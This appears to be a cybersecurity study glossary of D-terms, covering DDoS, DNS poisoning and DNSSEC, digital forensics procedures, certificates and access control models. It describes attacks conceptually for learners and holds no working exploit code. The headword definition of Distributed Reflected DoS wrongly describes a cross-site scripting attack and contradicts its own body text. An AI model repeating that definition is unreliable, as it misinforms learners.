Default Credentials (Network Vector) - The attacker gains control of a network device or app because it has been left configured with a default password. Default credentials are likely to be published in the product's setup documentation or are otherwise easy to discover.
Defense in Depth - Defense in depth is a comprehensive cybersecurity strategy that emphasizes the implementation of multiple layers of protection to safeguard an organization's information and infrastructure. This approach is based on the principle that no single security measure can completely protect against all threats. By deploying a variety of defenses at different levels, organizations can create a more resilient security posture that can withstand a wide range of attacks. For example, a defense in depth strategy might include perimeter security measures such as firewalls and intrusion detection systems to protect against external threats. Organizations can implement segmentation, secure access controls, and traffic monitoring at the network level to prevent unauthorized access and contain potential breaches. Endpoint security solutions, such as antivirus software and device hardening, help protect individual devices, while regular patch management ensures software vulnerabilities are addressed promptly.

Additionally, implementing strong user authentication methods, such as multifactor authentication, can further secure access to sensitive data and systems. Finally, employee security awareness training and incident response planning are essential components of a defense in depth strategy, helping to minimize human error and ensure a rapid response to security incidents.
Defensive Penetration Testing - The defensive team in a penetration test or incident response exercise.

Defensive penetration testing, or "Blue Teaming," evaluates an organization's defensive security measures, detection capabilities, incident response procedures, and overall resilience against cyber threats. Defensive penetration testing aims to assess the effectiveness of existing security controls and identify areas for improvement.
Denial of service (DoS) - Any type of physical, application, or network attack that affects the availability of a managed resource.

Denial of service (DoS) in a network context refers to attacks that cause hosts and services to become unavailable. This type of attack can be detected by monitoring tools that report when a host or service is not responding, or is suffering from abnormally high volumes of requests. A DoS attack might be launched as an end in itself, or to facilitate the success of other types of attacks.
Dependencies - Resources and other services that must be available and running for a service to start.
Deperimeterization - Deperimeterization refers to a security approach that shifts the focus from defending a network's boundaries to protecting individual resources and data within the network. As organizations adopt cloud computing, remote work, and mobile devices, traditional perimeter-based security models become less effective in addressing modern threats. Deperimeterization concepts advocate for implementing multiple security measures around individual assets, such as data, applications, and services. This approach includes robust authentication, encryption, access control, and continuous monitoring to maintain the security of critical resources, regardless of their location.

Trends Driving Deperimeterization

1. Cloud - Enterprise infrastructures are typically spread between on-premises and cloud platforms. In addition, cloud platforms may be used to distribute computing resources globally.

2. Remote Work - More and more organizations have adopted either part-time or full-time remote workforces. This remote workforce expands the enterprise footprint dramatically. In addition, employees working from home are more susceptible to security lapses when they connect from insecure locations and use personal devices.

3. Mobile - Modern smartphones and tablets are often used as primary computing devices as they have ample processor, memory, and storage capacity. More and more corporate data is accessed through these devices as their capabilities expand. Mobile devices and their associated operating systems have varying security features, and various budget devices are sometimes not supported by vendors shortly after release, meaning they cannot be updated or patched. In addition, mobile devices are often lost or stolen.

4. Outsourcing and Contracting - Support arrangements often provide remote access to external entities, and this access can often mean that the external provider's network serves as an entry point to the organizations they support.

5. Wireless Networks (Wi-Fi) - Wireless networks are susceptible to an ever-increasing array of exploits, but oftentimes wireless networks are open and unsecured or the network security key is well known.
Detection - An incident response process that correlates event data to determine whether they are indicators of an incident.
Detective Security Control - A type of security control that acts during an incident to identify or record that it is happening. The control may not prevent or deter access, but it will identify and record an attempted or successful intrusion. A detective control operates during an attack. Logs provide one of the best examples of detective-type controls.
Deterrent Security Control - A type of security control that discourages intrusion attempts. The control may not physically or logically prevent access, but it psychologically discourages an attacker from attempting an intrusion. This could include signs and warnings of legal penalties against trespass or intrusion.
Development and operations (DevOps) - A combination of software development and systems operations, and refers to the practice of integrating one discipline with the other. Development and operations (DevOps) is a cultural shift within an organization to encourage much more collaboration between developers and systems administrators. By creating a highly orchestrated environment, IT personnel and developers can build, test, and release software faster and more reliably.
Device Placement - Considerations for positioning security controls to protect network zones and individual hosts to implement a defense in depth strategy and to meet overall security goals.

Defense in depth is Security strategy that positions the layers of diverse security control categories and functions like preventive, detective, and corrective as opposed to relying on perimeter controls.
DevSecOps - A combination of software development, security operations, and systems operations, and refers to the practice of integrating each discipline with the others. DevSecOps extends the boundary to security specialists and personnel, reflecting the principle that security is a primary consideration at every stage of software development and deployment. This is also known as shift left, meaning that security considerations need to be made during requirements and planning phases, not grafted on at the end.
Dictionary Attack - A type of password attack that compares encrypted passwords against a predetermined list of possible password values.

A dictionary attack can be used where there is a good chance of guessing the likely value of the plaintext, such as a noncomplex password. The software generates hash values from a dictionary of plaintexts to try to match one to a captured hash.
Diffie-Hellman (D-H) - A cryptographic technique that provides secure key exchange.

Diffie-Hellman allows Alice and Bob to derive the same shared secret by sharing some related values. In the agreement process, they share some of them but keep others private. Mallory cannot possibly learn the secret from the values that are exchanged publicly. The authenticity of the values sent by the server is proved by using a digital signature.
Digital Certificate - Identification and authentication information presented in the X.509 format and issued by a certificate authority (CA) as a guarantee that a key pair is valid for a particular subject.

A digital certificate is essentially a wrapper for a subject's public key. As well as the public key, it contains information about the subject and the certificate's issuer. The certificate is digitally signed to prove that it was issued to the subject by a particular CA. The subject could be a human user (for certificates allowing the signing of messages, for instance) or a computer server (for a web server hosting confidential transactions, for instance).

Digital certificates are based on the X.509 standard approved by the International Telecommunications Union and standardized by the Internet Engineering Task Force. RSA also created a set of standards, referred to as Public Key Cryptography Standards (PKCS), to promote the use of public key infrastructure.

A digital certificate may contain fields for Organization (O), Organizational Unit (OU), Locality (L), State (ST), and Country (C). These can be concatenated with the Common Name (CN) to form a Distinguished Name (DN). For example, Example LLC's DN could be: CN=www.example.com, OU=Web Hosting, O=Example LLC, L=Chicago, ST=Illinois, C=US.
Digital Forensics - The process of gathering and submitting computer evidence for trial. Digital evidence is latent, meaning that it must be interpreted. This means that great care must be taken to prove that the evidence has not been tampered with or falsified.

Digital forensics is the practice of collecting evidence from computer systems to a standard that will be accepted in a court of law. Forensics investigations are most likely to be launched to prosecute crimes arising from insider threats, notably fraud or misuse of equipment. Prosecuting external threat sources is often difficult, as the threat actor may well be in a different country or have taken effective steps to disguise their location and identity. Such prosecutions are normally initiated by law enforcement agencies, where the threat is directed against military or governmental agencies or is linked to organized crime.

Like DNA or fingerprints, digital evidence is latent. Latent means that the evidence cannot be seen with the naked eye; rather, it must be interpreted using a machine or process. This means that formal steps must be taken to ensure the admissibility of digital evidence. As well as the physical evidence (a hard drive, for instance), digital forensics requires documentation showing how the evidence was collected and analyzed without tampering or bias.
Digital Forensics - Chain of Custody - Record of handling evidence from collection to presentation in court to disposal.

The host devices and media taken from the crime scene should be labeled, bagged, and sealed, using tamper-evident bags. It is also appropriate to ensure that the bags have antistatic shielding to reduce the possibility that data will be damaged or corrupted on the electronic media by electrostatic discharge (ESD). Each piece of evidence should be documented by a chain of custody form. Chain of custody documentation records where, when, and who collected the evidence, who subsequently handled it, and where it was stored. This establishes the integrity and proper handling of evidence. When security breaches go to trial, the chain of custody protects an organization against accusations that evidence has either been tampered with or is different than it was when it was collected. Every person in the chain who handles evidence must log the methods and tools they used.

The evidence should be stored in a secure facility; this not only means access control, but also environmental control, so that the electronic systems are not damaged by condensation, ESD, fire, and other hazards.
Digital Forensics - Data Acquisition - In digital forensics, the method and tools used to create a forensically sound copy of data from a source device, such as system memory or a hard disk.

Acquisition is the process of obtaining a forensically clean copy of data from a device seized as evidence. If the computer system or device is not owned by the organization, there is the question of whether search or seizure is legally valid. This impacts bring-your-own-device (BYOD) policies. For example, if an employee is accused of fraud, you must verify that the employee's equipment and data can be legally seized and searched. Any mistake may make evidence gained from the search inadmissible.

Data acquisition is also complicated by the fact that it is more difficult to capture evidence from a digital crime scene than it is from a physical one. Some evidence will be lost if the computer system is powered off; on the other hand, some evidence may be unobtainable until the system is powered off. Additionally, evidence may be lost depending on whether the system is shut down or "frozen" by suddenly disconnecting the power.

Acquisition usually proceeds by using a tool to make an image from the data held on the target device. An image can be acquired from either volatile or nonvolatile storage. The general principle is to capture evidence in the order of volatility (The order in which volatile data should be recovered from various storage locations and devices after a security incident occurs), from more volatile to less volatile. The ISOC best practice guide to evidence collection and archiving, sets out the general order as follows:

1. CPU registers and cache memory (including cache on disk controllers, graphics cards, and so on).

2. Contents of nonpersistent system memory (RAM), including routing table, ARP cache, process table, kernel statistics.

3. Data on persistent mass storage devices (HDDs, SSDs, and flash memory devices):
i. Partition and file system blocks, slack space, and free space.
ii. System memory caches, such as swap space/virtual memory and hibernation files.
iii. Temporary file caches, such as the browser cache.
iv. User, application, and OS files and directories.

4. Remote logging and monitoring data.

5. Physical configuration and network topology.

6. Archival media and printed documents.

The Windows registry is mostly stored on disk, but there are keys—notably HKLM\HARDWARE—that only ever exist in memory. The contents of the registry can be analyzed via a memory dump.
Digital Forensics - Disk Image Acquisition - Disk image acquisition refers to acquiring data from nonvolatile storage. Nonvolatile storage includes hard disk drives (HDDs), solid state drives (SSDs), firmware, other types of flash memory (USB thumb drives and memory cards), and optical media (CD, DVD, and Blu-ray). This can also be referred to as device acquisition, meaning the SSD storage in a smartphone or media player. Disk acquisition will also capture the OS installation if the boot volume is included.

There are three device states for persistent storage acquisition:

1. Live acquisition - This means copying the data while the host is still running. This may capture more evidence or more data for analysis and reduce the impact on overall services, but the data on the actual disks will have changed, so this method may not produce legally acceptable evidence. It may also alert the threat actor and allow time for them to perform anti-forensics.

2. Static acquisition by shutting down the host - This runs the risk that the malware will detect the shutdown process and perform anti-forensics to try to remove traces of itself.

3. Static acquisition by pulling the plug - This means disconnecting the power at the wall socket (not the hardware power-off button). This is most likely to preserve the storage devices in a forensically clean state, but there is the risk of corrupting data.

Given sufficient time at the scene, an investigator might decide to perform both a live and static acquisition. Whichever method is used, it is imperative to document the steps taken and supply a timeline and video-recorded evidence of actions taken to acquire the evidence.

There are many GUI imaging utilities, including those packaged with forensic suites. If no specialist tool is available, on a Linux host, the dd command (Linux command that makes a bit-by-bit copy of an input file, typically used for disk imaging) makes a copy of an input file (if=) to an output file (of=). In the following, sda is the fixed drive:

dd if=/dev/sda of=/mnt/usbstick/backup.img

A more recent fork of dd is dcfldd, which provides additional features like multiple output files and exact match verification.
Digital Forensics - Due Process - A term used in US and UK common law to require that people only be convicted of crimes following the fair application of the laws of the land.

Due process is a term used in US and UK common law to require that people only be convicted of crimes following the fair application of the laws of the land. More generally, due process can be understood to mean having a set of procedural safeguards to ensure fairness. This principle is central to forensic investigation. If a forensic investigation is launched (or if one is a possibility), it is important that technicians and managers are aware of the processes that the investigation will use. It is vital that they are able to assist the investigator and that they not do anything to compromise the investigation. In a trial, defense counsel will try to exploit any uncertainty or mistake regarding the integrity of evidence or the process of collecting it.
Digital Forensics - Legal Hold - Legal hold refers to the fact that information that may be relevant to a court case must be preserved. Information subject to legal hold might be defined by regulators or industry best practice, or there may be a litigation notice from law enforcement or lawyers pursuing a civil action. This means that computer systems may be taken as evidence, with all the obvious disruption to a network that entails. A company subject to legal hold will usually have to suspend any routine deletion/destruction of electronic or paper records and logs.
Digital Forensics - Preservation - It is vital that the evidence collected at the crime scene conform to a valid timeline (In digital forensics, a tool that shows the sequence of file system events within a source image in a graphical format). Digital information is susceptible to tampering, so access to the evidence must be tightly controlled. Video recording the whole process of evidence acquisition establishes the provenance (In digital forensics, being able to trace the source of evidence to a crime scene and show that it has not been tampered with) of the evidence as deriving directly from the crime scene.

To obtain a forensically sound image from nonvolatile storage, the capture tool must not alter data or metadata (properties) on the source disk or file system. Data acquisition would normally proceed by attaching the target device to a forensics workstation or field capture device equipped with a write blocker. A write blocker (A forensic tool to prevent the capture or analysis device or workstation from changing data on a target disk or media) prevents any data on the disk or volume from being changed by filtering write commands at the driver and OS level.

Evidence Integrity and Non-Repudiation
Once the target disk has been safely attached to the forensics workstation, data acquisition proceeds as follows:

1. A cryptographic hash of the disk media is made, using either the MD5 or SHA hashing function.

2. A bit-by-bit copy of the media is made using an imaging utility.

3. A second hash is then made of the image, which should match the original hash of the media.

4. A copy is made of the reference image, validated again by the checksum. Analysis is performed on the copy.

This proof of integrity ensures non-repudiation. If the provenance of the evidence is certain, the threat actor identified by analysis of the evidence cannot deny their actions. The hashes prove that no modification has been made to the image.

Chain of Custody

Record of handling evidence from collection to presentation in court to disposal.

The host devices and media taken from the crime scene should be labeled, bagged, and sealed, using tamper-evident bags. It is also appropriate to ensure that the bags have antistatic shielding to reduce the possibility that data will be damaged or corrupted on the electronic media by electrostatic discharge (ESD). Each piece of evidence should be documented by a chain of custody form. Chain of custody documentation records where, when, and who collected the evidence, who subsequently handled it, and where it was stored. This establishes the integrity and proper handling of evidence. When security breaches go to trial, the chain of custody protects an organization against accusations that evidence has either been tampered with or is different than it was when it was collected. Every person in the chain who handles evidence must log the methods and tools they used.

The evidence should be stored in a secure facility; this not only means access control, but also environmental control, so that the electronic systems are not damaged by condensation, ESD, fire, and other hazards.
Digital Forensics - Provenance - In digital forensics, being able to trace the source of evidence to a crime scene and show that it has not been tampered with.
Digital Forensics - Reporting - A forensics process that summarizes significant contents of digital data using open, repeatable, and unbiased methods and tools.

Digital forensics reporting summarizes the significant contents of the digital data and the conclusions from the investigator's analysis. It is important to note that strong ethical principles must guide forensics analysis:

1. Analysis must be performed without bias. Conclusions and opinions should be formed only from the direct evidence under analysis.

2. Analysis methods must be repeatable by third parties with access to the same evidence.

3. Ideally, the evidence must not be changed or manipulated. If a device used as evidence must be manipulated to facilitate analysis (disabling the lock feature of a mobile phone or preventing a remote wipe, for example), the reasons for doing so must be sound and the process of doing so must be recorded.
Defense counsel may try to use any deviation of good ethical and professional behavior to have the forensics investigator's findings dismissed.

A forensic examination of a device that contains electronically stored information (ESI) entails a search of the whole drive, including both allocated and unallocated sectors, for instance. E-discovery is a means of filtering the relevant evidence produced from all the data gathered by a forensic examination and storing it in a database in a format such that it can be used as evidence in a trial. E-discovery software tools have been produced to assist this process. Some of the functions of e-discovery suites are as follows:

1. Identify and de-duplicate files and metadata - Many files on a computer system are "standard" installed files or copies of the same file. E-discovery filters these types of files, reducing the volume of data that must be analyzed.

2. Search - Allow investigators to locate files of interest to the case. As well as keyword search, software might support semantic search. Semantic search matches keywords if they correspond to a particular context.

3. Tags - Apply standardized keywords or labels to files and metadata to help organize the evidence. Tags might be used to indicate relevancy to the case or part of the case or to show confidentiality, for instance.

4. Security - At all points, evidence must be shown to have been stored, transmitted, and analyzed without tampering.

5. Disclosure - An important part of trial procedure is that the same evidence be made available to both plaintiff and defendant. E-discovery can fulfill this requirement. Recent court cases have required parties to a court case to provide searchable ESI rather than paper records.
Digital Forensics - System Memory Acquisition - System memory is volatile data held in Random Access Memory (RAM) modules. Volatile means that the data is lost when power is removed. A system memory dump (A file containing data captured from system memory) creates an image file that can be analyzed to identify the processes that are running, the contents of temporary file systems, registry data, network connections, cryptographic keys, and more. It can also be a means of accessing data that is encrypted when stored on a mass storage device.

A specialist hardware or software tool can capture the contents of memory while the host is running. Unfortunately, this type of tool needs to be preinstalled as it requires a kernel mode driver to dump any data of interest. Various commercial tools are available to perform system memory acquisition on Windows. On Linux, the Volatility framework includes a tool to install a kernel driver.
Digital Forensics - Timeline - In digital forensics, a tool that shows the sequence of file system events within a source image in a graphical format.
Digital Forensics - Write Blocker - A forensic tool to prevent the capture or analysis device or workstation from changing data on a target disk or media.
Digital Signature - A message digest encrypted using the sender's private key that is appended to a message to authenticate the sender and prove message integrity.

A digital signature is a combination of public key cryptography and hasing.

Public key cryptography can authenticate a sender, because they control a private key that produces messages in a way that no one else can. Hashing proves integrity by computing a unique fixed-size message digest from any variable length input. These two cryptographic ciphers can be combined to make a digital signature:

1. The sender (Alice) creates a digest of a message, using a pre-agreed hash algorithm, such as SHA256, and then performs a signing operation on the digest using her chosen asymmetric cipher and private key.

2. Alice attaches the digital signature to the message and sends both the signature and the message to Bob.

3. Bob verifies the signature using Alice's public key, obtaining the original hash.

4. Bob then calculates his own digest for the document (using the same algorithm as Alice) and compares it with Alice's hash.

If the two digests are the same, then the data has not been tampered with during transmission, and Alice's identity is guaranteed. If either the data had changed or a malicious user (Mallory) had intercepted the message and used a different private key to sign it, the hashes would not match.

There are several standards for creating digital signatures. The Public Key Cryptography Standard #1 (PKCS#1) defines the use of RSA's algorithm. The Digital Signature Algorithm (DSA) uses a cipher called ElGamal, but Elliptic Curve DSA (ECDSA) is now more widely used. DSA and ECDSA were developed as part of the US government's Federal Information Processing Standards (FIPS).
Direct Access (Network Vector) - The threat actor uses physical access to the site to perpetrate an attack. Examples could include getting access to an unlocked workstation; using a boot disk to try to install malicious tools; or physically stealing a PC, laptop, or disk drive.
Directive Security Control - A type of control that enforces a rule of behavior through a policy or contract. The control enforces a rule of behavior, such as a policy, best practice standard, or standard operating procedure (SOP). For example, an employee's contract will set out disciplinary procedures or causes for dismissal if they do not comply with policies and procedures. Training and awareness programs can also be considered as directive controls.
Directory Service - A network service that stores identity information about all the objects in a particular network, including users, groups, servers, client computers, and printers.

A directory service stores information about users, computers, security groups/roles, and services. Each object in the directory has a number of attributes. The directory schema describes the types of attributes, what information they contain, and whether they are required or optional. In order for products from different vendors to be interoperable, most directory services are based on the Lightweight Directory Access Protocol (LDAP), which was developed from a standard called X.500.

Within an X.500-like directory, a distinguished name (DN) is a collection of attributes that define a unique identifier for any given resource. A distinguished name is made up of attribute-value pairs, separated by commas. The most specific attribute is listed first, and successive attributes become progressively broader. This most specific attribute is the relative distinguished name, as it uniquely identifies the object within the context of successive (parent) attribute values.

Some of the attributes commonly used include common name (CN), organizational unit (OU), organization (O), country (C), and domain component (DC).

For example, the distinguished name of a web server operated by Widget in the UK might be the following:

CN=WIDGETWEB, OU=Marketing, O=Widget, C=UK, DC=widget, DC=foo
Directory Traversal - An application attack that allows access to commands, files, and directories that may or may not be connected to the web document root directory.
Directory Traversal Attack - An application attack that allows access to commands, files, and directories that may or may not be connected to the web document root directory.

Directory traversal is another type of injection attack performed against a web server. The threat actor submits a request for a file outside the web server's root directory by submitting a path to navigate to the parent directory ( ../ ). This attack can succeed if the input is not filtered properly, and access permissions on the file allow the web server's process to read, write, or execute it.
Disassociation Attack (Wireless DoS) - Spoofing frames to disconnect a wireless station to try to obtain authentication data to crack.

A disassociation attack exploits the lack of encryption in management frame traffic to send spoofed frames. One type of disassociation attack injects management frames that spoof the MAC address of a single victim station in a disassociation notification, causing it to be disconnected from the network. Another variant of the attack broadcasts spoofed frames to disconnect all stations. As well as trying to redirect connections to an evil twin, a disassociation attack might also be used in conjunction with a replay attack aimed at recovering the network key.
Disaster Recovery - A documented and resourced plan showing actions and responsibilities to be used in response to critical incidents. These policies detail the steps required to recover from a catastrophic event such as a natural disaster, major hardware failure, or a significant security breach. The goal is to restore operations as quickly and efficiently as possible.
Discretionary Access Control (DAC) - An access control model where each resource is protected by an access control list (ACL) managed by the resource's owner (or owners).

Discretionary access control (DAC) is based on the primacy of the resource owner. In a DAC model, every resource has an owner. The owner creates a file or service although ownership can be assigned to another user. The owner has full control over the resource and they can modify its access control list (ACL) to grant rights to others.

DAC is the most flexible model and is currently implemented widely in computer and network security. In file system security, it is the model used by default for most UNIX/Linux distributions and Microsoft Windows. As the most flexible model, it is also the weakest because it makes centralized administration of security policies the most difficult to enforce. It is also the easiest to compromise, as it is vulnerable to insider threats and abuse of compromised accounts.
Disinformation - A type of attack that falsifies an information resource that is normally trusted by others. Falsifies some type of trusted resource, such as changing the content of a website, manipulating search engines to inject fake sites, or using bots to post false information to social media sites.
Distinguished Name (DN) - A collection of attributes that define a unique identifier for any given resource within an X.500-like directory.

A distinguished name (DN) is a collection of attributes that define a unique identifier for any given resource. A distinguished name is made up of attribute-value pairs, separated by commas. The most specific attribute is listed first, and successive attributes become progressively broader. This most specific attribute is the relative distinguished name, as it uniquely identifies the object within the context of successive (parent) attribute values.
Distributed Denial of Service (DDoS) Attacks - An attack that involves the use of infected Internet-connected computers and devices to disrupt the normal flow of traffic of a server or service by overwhelming the target with traffic.

A denial of service (DoS - Any type of physical, application, or network attack that affects the availability of a managed resource) attack is anything that reduces the availability of a resource. DoS attacks can target physical hardware and infrastructure. A malware-based DoS attack might destroy a file system or engineer excessive CPU, memory, storage, or network bandwidth consumption.

A DoS attack can also exploit protocol or configuration weaknesses at different network layers. DoS attacks against network hosts and gateways are typically of a type called distributed DoS (DDoS). DDoS means that the attack is launched from multiple hosts simultaneously. Typically, a threat actor will compromise machines to use as handlers in a command and control network. The handlers are used to compromise thousands or millions of hosts with DDoS bot tools, forming a botnet.

Some types of DDoS attacks simply aim to consume network bandwidth, denying it to legitimate hosts, by using overwhelming numbers of bots making ordinary requests. Others cause resource exhaustion on the victim host by bombarding them with requests, which consume CPU cycles and memory. This delays processing of legitimate traffic and could potentially crash the host system completely. For example, a SYN flood attack (A DoS attack where the attacker sends numerous SYN requests to a target server, hoping to consume enough resources to prevent the transfer of legitimate traffic) works by withholding the client's ACK packet during TCP's three-way handshake. A server, router, or firewall can maintain a queue of pending connections, recorded in its state table. When it does not receive an ACK packet from the client, it resends the SYN/ACK packet a set number of times before timing out the connection. The problem is that a server may only be able to manage a limited number of pending connections, which the DDoS attack quickly fills up. This means that the server is unable to respond to genuine traffic.

Reflected Attacks
Assembling and managing a botnet large enough to overwhelm a network that has effective DDoS mitigation measures can be a costly endeavor. This has prompted threat actors to devise DDoS techniques that increase the effectiveness of each attack. In a distributed reflected DoS (DRDoS - A malicious request to a legitimate server is created and sent as a link to the victim, so that a server-side flaw causes the malicious component to run on the target’s browser) attack, the threat actor spoofs the victim's IP address and attempts to open connections with multiple third-party servers. Those servers direct their SYN/ACK responses to the victim host. This rapidly consumes the victim's available bandwidth.

An asymmetric threat is one where the threat actor is able to perpetrate effective attacks despite having fewer resources than the victim.

Amplified Attacks
An amplification attack (A network-based attack where the attacker dramatically increases the bandwidth sent to a victim during a DDoS attack by implementing an amplification factor) is a type of reflected attack that targets weaknesses in specific application protocols to make the attack more effective at consuming target bandwidth. Amplification attacks exploit protocols that allow the attacker to manipulate the request in such a way that the target is forced to respond with a large amount of data. Protocols commonly targeted include domain name system (DNS), Network Time Protocol (NTP), and Connectionless Lightweight Directory Access Protocol (CLDAP). Another example of a particularly effective attack exploits the memcached database caching system used by web servers.

DDoS Indicators
DDoS attacks can be diagnosed by traffic spikes that have no legitimate explanation, but they can usually only be mitigated by providing high availability services, such as load balancing and cluster services. In some cases, a stateful firewall can detect a DDoS attack and automatically block the source. However, for many of the techniques used in DDoS attacks, the source addresses will be randomly spoofed or launched by bots, making it difficult to stop the attack at the source.
Distributed DoS (DDoS) - An attack that involves the use of infected Internet-connected computers and devices to disrupt the normal flow of traffic of a server or service by overwhelming the target with traffic.
Distributed Reflected DoS (DRDoS) - A malicious request to a legitimate server is created and sent as a link to the victim, so that a server-side flaw causes the malicious component to run on the target’s browser.

Assembling and managing a botnet large enough to overwhelm a network that has effective DDoS mitigation measures can be a costly endeavor. This has prompted threat actors to devise DDoS techniques that increase the effectiveness of each attack. In a distributed reflected DoS (DRDoS) attack, the threat actor spoofs the victim's IP address and attempts to open connections with multiple third-party servers. Those servers direct their SYN/ACK responses to the victim host. This rapidly consumes the victim's available bandwidth.

An asymmetric threat is one where the threat actor is able to perpetrate effective attacks despite having fewer resources than the victim.
DNS Attack Indicators - A DNS server may log an event each time it handles a request to convert between a domain name and an IP address. DNS event logs can hold a variety of information that may supply useful security intelligence and attack indicators, such as the following:

1. The types of queries a host has made to DNS.

2. Hosts that are in communication with suspicious IP address ranges or domains.

3. Statistical anomalies such as spikes or consistently large numbers of DNS lookup failures, which may point to computers that are infected with malware, misconfigured, or running obsolete or faulty applications.

DNS is also a popular choice for implementing command & control (C&C) of remote access Trojans. It can be used as a means of covertly exfiltrating data from a private network.
DNS Client Cache Poisoning - Before DNS was developed in the 1980s, name resolution took place using a text file named HOSTS. Each name:IP address mapping was recorded in this file, and systems administrators had to download the latest copy and install it on each Internet client or server manually. Even though most name resolution now functions through DNS, the HOSTS file is still present and most operating systems check the file before using DNS. Its contents are loaded into a cache of known name:IP mappings , and the client only contacts a DNS server if the name is not cached. Therefore, if an attacker is able to place a false name:IP address mapping in the HOSTS file and effectively poison the DNS cache, they will be able to redirect traffic. The HOSTS file requires administrator access to modify. In UNIX and Linux systems it is stored as /etc/hosts , while in Windows it is placed in %SystemRoot%\System32\Drivers\etc\hosts . The presence of suspect entries in the HOSTS file is an indicator that the machine has been compromised.
DNS Filtering - Domain Name System (DNS) filtering is a technique that blocks or allows access to specific websites by controlling the resolution of domain names into IP addresses. It operates on the principle that for a device to access a website, it must first resolve its domain name into its associated IP address, a process managed by DNS. When a request is made to resolve a website URL, the DNS filter checks the request against a database of domain names. If the domain is associated with malicious activities or is on an unapproved list for any reason, the filter blocks the request, preventing access to the potentially harmful website.

DNS filtering is highly effective for many reasons. A few are listed below:

1. It provides a proactive defense mechanism, blocking access to known phishing sites, malware distribution sites, and other malicious online destinations.

2. It can help enforce an organization's acceptable use policies (AUPs) by blocking access to inappropriate or distracting websites and ensuring that the Internet is used responsibly and productively.

3. It can protect all devices connected to a network, including IoT devices, providing an extra layer of security.

4. It is a simple solution that is easy to implement and presents minimal risk, making it a cost-effective security control suitable for networks of any size.

While DNS filtering is highly effective, it must be combined with other security measures for comprehensive protection.

Implementing DNS Filtering
DNS filtering is implemented using different methods and tools. A prevalent method is through DNS filtering services like Cisco's OpenDNS, Quad9, or CleanBrowsing. These services provide DNS resolution with built-in filtering, simply requiring organizations and users to redirect their DNS requests to the filtering service's DNS servers.

Organizations that manage their own DNS servers, such as Microsoft's DNS server or BIND, can directly implement DNS filtering. This method, albeit more complex, provides complete control over filtering policies and permits the integration of block lists or Response Policy Zone (RPZ) feeds into server configurations.

Another strategy involves using DNS firewalls, which intercept DNS queries at the network level and apply filtering rules accordingly. Some endpoint protection tools and antivirus software provide DNS filtering capabilities to provide device-level protection ideal for laptops and other mobile devices that may connect to numerous networks with varying levels of security enabled by default.

Open source Pi-hole or ADGuard software can be configured as a local DNS resolver with filtering capabilities. This software runs on Linux and is commonly implemented using Raspberry Pi hardware due to its low-performance overhead. Regardless of the method chosen, customization of filtering policies allows for categorizing websites to simplify the creation of block lists or allow lists per requirements. Keeping DNS filters updated is essential to effective DNS filtering to keep pace with evolving threats and changing organizational needs.

DNS Security
DNS is a critical service that should be configured to be fault tolerant. DoS attacks are hard to perform against the servers that perform Internet name resolution, but if an attacker can target the DNS server on a private network, it is possible to seriously disrupt the operation of that network.

To ensure DNS security on a private network, local DNS servers should only accept recursive queries from local hosts (preferably authenticated local hosts) and not from the Internet. You also need to implement access control measures on the server to prevent a malicious user from altering records manually. Similarly, clients should be restricted to using authorized resolvers to perform name resolution.

Attacks on DNS may also target the server application and/or configuration. Many DNS services run on BIND (Berkley Internet Name Domain), distributed by the Internet Systems Consortium (isc.org). There are known vulnerabilities in many versions of the BIND server, so it is critical to patch the server to the latest version. The same general advice applies to other DNS server software, such as Microsoft's. Obtain and check security announcements and then test and apply critical and security-related patches and upgrades.

DNS footprinting means obtaining information about a private network by using its DNS server to perform a zone transfer (all the records in a domain) to a rogue DNS or simply by querying the DNS service, using a tool such as nslookup or dig. To prevent this, you can apply an access control list to prevent zone transfers to unauthorized hosts or domains, to prevent an external server from obtaining information about the private network architecture.

DNS Security Extensions (DNSSEC - Security protocol that provides authentication of DNS data and upholds DNS data integrity) help to mitigate against spoofing and poisoning attacks by providing a validation process for DNS responses. With DNSSEC enabled, the authoritative server for the zone creates a "package" of resource records (called an RRset) signed with a private key (the Zone Signing Key). When another server requests a secure record exchange, the authoritative server returns the package along with its public key, which can be used to verify the signature.

The public Zone Signing Key is itself signed with a separate Key Signing Key. Separate keys are used so that if there is some sort of compromise of the Zone Signing Key, the domain can continue to operate securely by revoking the compromised key and issuing a new one.

The Key Signing Key for a particular domain is validated by the parent domain or host ISP. The top-level domain trusts are validated by the Regional Internet Registries and the DNS root servers are self-validated, using a type of M-of-N control group key signing. This establishes a chain of trust from the root servers down to any particular subdomain.
DNS Poisoning - An attack where a threat actor injects false resource records into a client or server cache to redirect a domain name to an IP address of the attacker's choosing. DNS poisoning compromises the process by which clients query name servers to locate the IP address for a domain name. There are several ways that a DNS poisoning attack can be perpetrated.
DNS Security Extensions (DNSSEC) - Security protocol that provides authentication of DNS data and upholds DNS data integrity.

DNS Security Extensions (DNSSEC) help to mitigate against spoofing and poisoning attacks by providing a validation process for DNS responses. With DNSSEC enabled, the authoritative server for the zone creates a "package" of resource records (called an RRset) signed with a private key (the Zone Signing Key). When another server requests a secure record exchange, the authoritative server returns the package along with its public key, which can be used to verify the signature.

The public Zone Signing Key is itself signed with a separate Key Signing Key. Separate keys are used so that if there is some sort of compromise of the Zone Signing Key, the domain can continue to operate securely by revoking the compromised key and issuing a new one.

The Key Signing Key for a particular domain is validated by the parent domain or host ISP. The top-level domain trusts are validated by the Regional Internet Registries and the DNS root servers are self-validated, using a type of M-of-N control group key signing. This establishes a chain of trust from the root servers down to any particular subdomain.
DNS Server Cache Poisoning - DNS server cache poisoning aims to corrupt the records held by the DNS server itself. This can be accomplished by performing DoS against the server that holds the authorized records for the domain, and then spoofing replies to requests from other name servers. Another attack involves getting the victim name server to respond to a recursive query from the attacking host. A recursive query compels the DNS server to query the authoritative server for the answer on behalf of the client. The attacker's DNS, masquerading as the authoritative name server, responds with the answer to the query, but also includes a lot of false domain:IP mappings for other domains that the victim DNS accepts as genuine. The nslookup or dig tool can be used to query the name records and cached records held by a server to discover whether any false records have been inserted.
DNS Sinkhole - A temporary DNS record that redirects malicious traffic to a controlled IP address.

Using a DNS sinkhole to route suspect traffic to a different network, such as a honeynet, where it can be analyzed.
DNS-Based On-Path Attacks - If the threat actor has access to the same local network as the victim, the attacker can use ARP poisoning to respond to DNS queries from the victim with spoofed replies. This might be combined with a denial of service attack on the victim's legitimate DNS server. A rogue DHCP could be used to configure clients with the address of a DNS resolver controlled by the threat actor.
Document Files (Lure-Based Vector) - The threat actor conceals malicious code by embedding it in word processing and PDF format files. This can take advantage of scripting features, or simply exploit a vulnerability in the document viewer or editor software.
Documentation and Version Control - The practice of ensuring that the assets that make up a project are closely managed when it comes time to make changes.

